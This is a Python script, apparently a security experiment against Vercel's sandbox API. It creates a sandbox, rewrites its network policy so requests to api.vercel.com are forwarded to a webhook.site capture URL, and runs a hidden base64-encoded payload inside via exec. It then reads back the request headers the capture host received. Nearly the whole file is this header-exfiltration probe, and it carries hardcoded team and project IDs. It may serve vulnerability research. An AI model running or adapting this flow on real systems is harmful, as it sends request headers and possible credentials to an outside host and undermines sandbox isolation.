# 实验G3流程: 创建沙箱 -> update(forwardURL=webhook.site) -> 沙箱请求触发转发
# 然后本地读取 webhook.site 捕获的请求头
import json, base64, pathlib, urllib.request, urllib.error

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
UUID = "37300a03-8069-4291-b1a5-3a5adeba1ae4"

def api(method, path, body=None, base="https://api.vercel.com"):
    req = urllib.request.Request(f"{base}{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=60) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:500]

NAME = "expg3"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org", "api.vercel.com"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
           {"allow": {"api.vercel.com": [
               {"match": {"path": {"startsWith": "/v2"}},
                "forwardURL": f"https://webhook.site/{UUID}"}]}})
print("update:", c, r[:150])

payload = base64.b64encode(pathlib.Path("exp_g3.py").read_bytes()).decode()
body = {"command": "python3", "args": ["-c", f"import base64;exec(base64.b64decode('{payload}').decode())"],
        "wait": True, "logs": True, "timeout": 60000}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
print("cmd:", c)
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            print(d.get("data", ""), end="")
        elif d.get("stream") == "command":
            print("\nEXIT:", d.get("command", {}).get("exitCode"))
    except Exception:
        print(line[:300])

import time
time.sleep(3)
# 本地读取 webhook.site 捕获的请求
print("\n===== webhook.site captured =====")
try:
    req = urllib.request.Request(f"https://webhook.site/{UUID}/requests/latest")
    with urllib.request.urlopen(req, timeout=20) as resp:
        d = json.loads(resp.read().decode())
    hdrs = d.get("headers", {})
    print("method:", d.get("method"), "url:", d.get("url"))
    for k in sorted(hdrs.keys()):
        v = hdrs[k]
        if isinstance(v, list):
            v = v[0] if v else ""
        print(f"  {k}: {str(v)[:150]}")
except Exception as e:
    print("webhook read error:", e)
